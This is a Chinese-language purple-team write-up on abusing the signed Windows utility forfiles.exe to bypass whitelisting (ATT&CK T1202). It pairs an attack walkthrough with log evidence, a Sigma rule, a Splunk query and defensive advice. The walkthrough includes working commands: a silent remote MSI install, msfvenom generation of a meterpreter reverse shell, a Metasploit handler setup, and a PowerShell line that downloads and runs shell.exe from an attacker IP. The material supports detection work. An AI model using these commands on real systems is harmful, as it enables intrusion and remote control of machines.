# T1202-间接命令执行-基于Forfiles执行Payload(白名单)

## 描述

攻击者可利用Windows实用程序（如`forfiles.exe`）间接执行命令，绕过防御机制。`forfiles.exe`是Windows默认的文件操作搜索工具，位于`C:\Windows\System32\`和`C:\Windows\SysWOW64\`，由Microsoft签名，包含在系统`PATH`环境变量中。它用于基于日期、后缀名或修改时间等条件操作文件，常与批处理配合使用，但可通过`/c`参数执行任意命令。

攻击者滥用`forfiles.exe`通过构造命令（如调用`cmd.exe`或`msiexec.exe`）执行恶意Payload，绕过应用程序白名单（如AppLocker）或防病毒检测。此技术常用于初始访问后的持久化、权限提升或横向移动。

## 测试案例

### 测试案例1：Forfiles执行远程MSI Payload
`forfiles.exe`通过`/c`参数调用`cmd.exe`执行命令，加载远程MSI文件。以下为测试案例：

**命令**：
```cmd
forfiles /p C:\Windows\System32 /m cmd.exe /c "msiexec.exe /q /i http://192.168.126.146/abc.msi"
```

- **说明**：
  - `/p`：指定搜索路径（`C:\Windows\System32`）。
  - `/m`：指定匹配文件（`cmd.exe`）。
  - `/c`：执行指定命令（调用`msiexec.exe`加载MSI文件）。
  - `msiexec.exe /q /i`：静默安装MSI文件。
- **权限**：无需提升权限，普通用户可执行。
- **注意**：需确保MSI文件与目标系统架构（32位/64位）匹配。

### 补充说明
- 日志监控：
  - 在高版本Windows（如Windows7及以上），可通过组策略启用进程命令行参数记录：
    - 路径：`本地计算机策略>计算机配置>管理模板>系统>审核进程创建>在过程创建事件中加入命令行>启用`
  - 部署Sysmon，记录进程创建和网络活动。
- 局限性：
  - 默认Windows日志可能不记录完整命令行，需启用审核策略。
  - 合法文件操作可能触发类似日志，需结合上下文分析。

## 检测日志

### 数据来源
- Windows安全日志：
  - 事件ID4688：进程创建，记录`forfiles.exe`及其子进程的执行信息。
- Sysmon日志：
  - 事件ID1：进程创建，包含命令行、哈希值和父进程。
  - 事件ID3：网络连接，记录MSI文件的HTTP请求。
  - 事件ID7：映像加载，记录加载的DLL。
  - 事件ID10：进程访问，记录子进程调用。
- 网络监控：
  - 检测`msiexec.exe`或其子进程发起的HTTP请求或反弹Shell连接。
- 文件监控：
  - 检测非标准路径下的MSI文件。

## 测试复现

### 环境准备
- 攻击机：KaliLinux2019
- 靶机：Windows7
- 工具：
  - MetasploitFramework（生成Payload和监听）
  - Sysmon（可选，日志收集）
  - PythonHTTP服务器（托管MSI文件）

### 攻击分析

#### 测试1：Forfiles执行远程MSI Payload
1. **解决反弹Shell失败问题**：

- 问题：反弹Shell失败，可能因MSI文件格式不正确或MSF配置错误。
- 解决：
  - 确保生成64位Payload以匹配Windows7（x64）。
  - 修正MSF配置中的LPORT（测试案例中LPORT设置为5555，但应为8888）。
  - 使用EXE格式Payload并直接调用，简化测试流程。

2. **生成Payload**：
   ```bash
   msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.126.146 LPORT=8888 -f exe -o shell.exe
   ```

3. **托管Payload**：
   在攻击机上启动HTTP服务器：
   ```bash
   cp shell.exe /var/www/html/shell.exe
   sudo python3 -m http.server 80
   ```

4. **配置攻击机监听**：
   ```bash
   msf5>use exploit/multi/handler
   msf5 exploit(multi/handler)>set payload windows/x64/meterpreter/reverse_tcp
   msf5 exploit(multi/handler)>set LHOST 192.168.126.146
   msf5 exploit(multi/handler)>set LPORT 8888
   msf5 exploit(multi/handler)>exploit
   ```

5. **靶机执行Payload**：

- 修改测试命令，直接调用EXE：
  ```cmd
  forfiles /p C:\Windows\System32 /m cmd.exe /c "C:\Windows\System32\shell.exe"
  ```

- 将`shell.exe`复制到靶机`C:\Windows\System32\`（或通过HTTP下载后执行）：
  ```cmd
  forfiles /p C:\Windows\System32 /m cmd.exe /c "powershell -c (New-Object System.Net.WebClient).DownloadFile('http://192.168.126.146/shell.exe','C:\Windows\System32\shell.exe'); C:\Windows\System32\shell.exe"
  ```

6. **结果分析**：

- 成功：获得Meterpreter会话，`getuid`显示用户为`12306Br0-PC\12306Br0`。

- 失败可能原因：
  - 防火墙阻止HTTP请求或TCP8888连接。
  - Payload架构不匹配（需生成64位Payload）。
  - PowerShell执行策略限制（需设置为`Bypass`：`Set-ExecutionPolicy Bypass`）。

## 测试留痕

### Windows安全日志
- 事件ID4688：
  ```
  进程信息:
    新进程ID:0x4c4
    新进程名称:C:\Windows\System32\forfiles.exe
    命令行:forfiles /p C:\Windows\System32 /m cmd.exe /c "C:\Windows\System32\shell.exe"
  ```
  ```
  进程信息:
    新进程ID:0x588
    新进程名称:C:\Windows\System32\shell.exe
    命令行:C:\Windows\System32\shell.exe
  ```

### Sysmon日志
- 事件ID1：
  ```
  事件ID:1
  OriginalFileName:forfiles.exe
  CommandLine:forfiles /p C:\Windows\System32 /m cmd.exe /c "C:\Windows\System32\shell.exe"
  CurrentDirectory:C:\Users\12306Br0\
  User:12306Br0-PC\12306Br0
  Hashes:SHA1=7A3B2C1D4E5F67890123456789ABCDEF01234567
  ParentImage:C:\Windows\System32\cmd.exe
  ```
  ```
  事件ID:1
  OriginalFileName:shell.exe
  CommandLine:C:\Windows\System32\shell.exe
  CurrentDirectory:C:\Windows\System32\
  User:12306Br0-PC\12306Br0
  Hashes:SHA1=C11C194CA5D0570F1BC85BB012F145BAFC9A4D6C
  ParentImage:C:\Windows\System32\cmd.exe
  ```
- 事件ID3：
  ```
  事件ID:3
  Image:C:\Windows\System32\shell.exe
  Initiated:true
  SourceIp:192.168.126.149
  SourcePort:49163
  DestinationIp:192.168.126.146
  DestinationPort:8888
  ```

## 检测规则/思路

### 检测方法
1. 进程监控：
   - 检测`forfiles.exe`的执行，尤其是调用`cmd.exe`或`msiexec.exe`的场景。
   - 检查命令行是否包含`/c`和可执行文件（如`.exe`、`.msi`）。
2. 命令行分析：
   - 正则表达式匹配：
     ```regex
     forfiles\.exe.*\/c.*(\.exe|\.msi|http)
     ```
3. 网络监控：
   - 检测`msiexec.exe`或其子进程发起的HTTP请求或反弹Shell连接（如TCP8888）。
4. 文件监控：
   - 检测非系统路径下的可执行文件或MSI文件。
5. 行为分析：
   - 检测`forfiles.exe`触发子进程的异常行为。

### Sigma规则
新增Sigma规则以增强检测：
```yaml
title:可疑Forfiles.exe执行Payload
id:1a2b3c4d-5e6f-7890-a1b2-c3d4e5f67890
description:检测forfiles.exe通过/c参数执行可执行文件或MSI，可能用于代理恶意代码
status:experimental
logsource:
  category:process_creation
  product:windows
detection:
  selection:
    Image|endswith:'\forfiles.exe'
    CommandLine|contains:'/c'
  filter_legitimate:
    CommandLine|contains:
      - '.txt'
      - '.log'
  condition:selection and not filter_legitimate
fields:
  - Image
  - CommandLine
  - ParentImage
  - User
falsepositives:
  - 合法的文件操作脚本
level:high
tags:
  - attack.execution
  - attack.t1202
```

规则说明：
- 目标：检测`forfiles.exe`使用`/c`参数执行命令。
- 过滤：排除常见的文件操作（如处理`.txt`或`.log`文件）。
- 日志来源：Windows事件ID4688（需启用命令行审核）或Sysmon事件ID1。
- 误报处理：合法批处理脚本可能触发，需结合命令行和子进程分析。
- 级别：标记为“高”优先级，因`forfiles.exe`滥用通常与恶意活动相关。

### Splunk规则
```spl
index=windows source="WinEventLog:Microsoft-Windows-Sysmon/Operational"
(EventCode=1 Image="*\forfiles.exe" CommandLine="*/c*")
OR (EventCode=10 SourceImage="*\forfiles.exe" TargetImage IN ("*\cmd.exe","*\msiexec.exe","*.exe"))
OR (EventCode=3 Initiated="true" SourceImage IN ("*\msiexec.exe","*.exe") DestinationPort="8888")
| fields Image,CommandLine,ParentImage,User,TargetImage,DestinationIp,DestinationPort
```

规则说明：
- 检测`forfiles.exe`的异常执行（事件ID1）、触发的子进程（事件ID10）和网络连接（事件ID3）。
- 减少误报：结合命令行、子进程和网络行为分析。

### 检测挑战
- 误报：合法批处理脚本可能触发，需结合上下文（如文件类型、子进程）。
- 日志依赖：默认日志可能不记录完整命令行，需部署Sysmon或增强日志策略。

## 防御建议
1. 监控和日志：
   - 启用命令行审核策略，确保事件ID4688记录完整参数。
   - 部署Sysmon，配置针对`forfiles.exe`的规则，监控进程创建和网络活动。
2. 网络隔离：
   - 限制非必要主机的HTTP出站连接，尤其是高危端口（如8888）。
3. 文件审查：
   - 定期扫描非系统路径下的可执行文件和MSI文件，检查文件哈希。
4. 权限控制：
   - 限制普通用户执行`forfiles.exe`的权限。
5. 安全更新：
   - 保持Windows系统更新，修复潜在漏洞。

## 参考推荐
- MITREATT&CKT1202:  
  <https://attack.mitre.org/techniques/T1202/>
- 基于白名单Forfiles执行Payload:  
  <https://www.bookstack.cn/read/Micro8/Chapter1-81-90-84_%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Forfiles%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E5%8D%81%E5%9B%9B%E5%AD%A3.md>
- MicrosoftForfiles文档:  
  <https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc753551(v=ws.11)>
- Sysmon配置与检测:  
  <https://github.com/SwiftOnSecurity/sysmon-config>
- MetasploitFramework:用于生成和测试反弹Shell。  
  <https://www.metasploit.com/>
- Sysmon:Microsoft提供的系统监控工具。  
  <https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon>
